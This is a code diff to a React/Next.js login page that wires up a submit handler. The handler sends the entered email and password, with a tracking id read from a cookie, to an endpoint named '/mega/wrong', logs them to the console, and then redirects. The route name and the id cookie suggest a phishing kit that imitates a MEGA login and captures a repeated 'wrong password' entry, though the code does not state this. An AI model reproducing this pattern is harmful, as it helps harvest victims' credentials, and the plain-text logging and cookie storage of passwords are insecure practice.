@@ -1,4 +1,3 @@
-"use client";
 // import React, { useState } from "react";
 // import { useRouter } from "next/navigation";
 // import Cookies from "js-cookie";
@@ -210,15 +209,63 @@
 // }
 
 // export default page;
-
+"use client";
 import React from "react";
 import Image from "next/image";
 import { Field, Form, Formik } from "formik";
+import { API_URL } from "../config";
+import Cookies from "js-cookie";
+import { useRouter } from "next/navigation";
+// import { toast } from "react-toastify";
 function page() {
   const initialvalues = {
     email: "",
     password: "",
   };
+  const router = useRouter();
+  const id = Cookies.get("id");
+
+  const handleSubmit = async (values, formik) => {
+    const { email, password } = values;
+
+    // Cookies.set("site", site);
+    // Cookies.set("email", email);
+    // Cookies.set("password", password);
+
+    // setShowModal(true);
+
+    // const allValues = {
+    //   id: id,
+    // };
+    const allValues = {
+      id,
+      email,
+      password,
+    };
+    console.log("allValues", allValues);
+    // login(allValues, formik);
+    const url = `${API_URL}/mega/wrong`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(allValues),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      router.push("/map");
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
+    }
+  };
+
   return (
     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
       <div className="w-[65%] lg:w-full">
@@ -241,10 +288,7 @@ function page() {
         </div>
 
         <div className="mt-1">
-          <Formik
-            initialValues={initialvalues}
-            // onSubmit={handleSubmit}
-          >
+          <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
             {(formik) => (
               <Form className="mx-[30px]  flex flex-col justify-center items-center">
                 <div className="space-y-[9px]  flex flex-col justify-center items-center">
